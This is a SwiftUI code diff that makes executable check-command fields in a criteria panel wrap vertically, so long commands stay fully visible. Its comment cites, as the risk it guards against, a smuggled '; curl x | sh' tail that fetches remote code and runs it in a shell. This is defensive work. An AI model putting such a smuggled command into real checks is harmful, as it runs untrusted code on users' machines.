@@ -642,6 +642,8 @@ private struct LockedCriterionRow: View {
             if criterion.kind == .executable, let check = criterion.check {
                 Text(check)
                     .font(.system(.caption, design: .monospaced))
+                    .lineLimit(nil)
+                    .fixedSize(horizontal: false, vertical: true)
                     .foregroundStyle(.secondary)
                     .padding(.horizontal, 6)
                     .padding(.vertical, 2)
@@ -1176,9 +1178,14 @@ private struct CriterionRow: View {
                     .clipShape(RoundedRectangle(cornerRadius: 6))
             }
             if criterion.kind == .executable {
-                TextField("Check command (e.g. swift test)", text: $checkText)
+                // Vertical and unlimited, so the whole check wraps into view: an approved check may
+                // run unasked (#334), and a one-line field can scroll a `; curl x | sh` tail out
+                // of sight. The panel's ScrollView and its maxHeight cap bound the height (inv. 8).
+                TextField("Check command (e.g. swift test)", text: $checkText, axis: .vertical)
                     .textFieldStyle(.plain)
                     .font(.system(.caption, design: .monospaced))
+                    .lineLimit(nil)
+                    .fixedSize(horizontal: false, vertical: true)
                     .padding(6)
                     .background(Color.irisIndigo.opacity(0.07))
                     .clipShape(RoundedRectangle(cornerRadius: 6))
